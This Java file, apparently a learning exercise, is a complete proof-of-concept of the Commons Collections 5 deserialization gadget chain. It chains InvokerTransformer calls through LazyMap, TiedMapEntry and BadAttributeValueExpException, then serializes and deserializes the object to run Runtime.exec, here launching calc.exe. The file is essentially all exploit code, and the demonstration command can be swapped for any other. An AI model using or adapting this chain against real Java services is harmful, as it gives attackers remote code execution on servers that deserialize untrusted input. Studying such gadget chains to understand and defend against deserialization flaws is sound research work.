package CC;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;

public class CC5Test {
    public static void main(String[] args) throws Exception {

        //构造核心利用代码
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
        };

        //构造利用链
        ChainedTransformer chain = new ChainedTransformer(transformers);

        //触发连
        HashMap hashMap = new HashMap();
        LazyMap lazymap = (LazyMap) LazyMap.decorate(hashMap, chain);
        //将lazyMap传给TiedMapEntry
        TiedMapEntry entry = new TiedMapEntry(lazymap, "test");
        //TiedMapEntry entry1 = new TiedMapEntry(null, "test");
        //反射调用TiedMapEntry
        BadAttributeValueExpException bad = new BadAttributeValueExpException(null);
        System.out.println(bad);
        System.out.println(entry);
        //System.out.println(entry1);
        Field val = bad.getClass().getDeclaredField("val");
        val.setAccessible(true);
        val.set(bad,entry);

        //序列化  -->  反序列化
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(bad);
        oos.close();
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        ois.readObject();
    }
}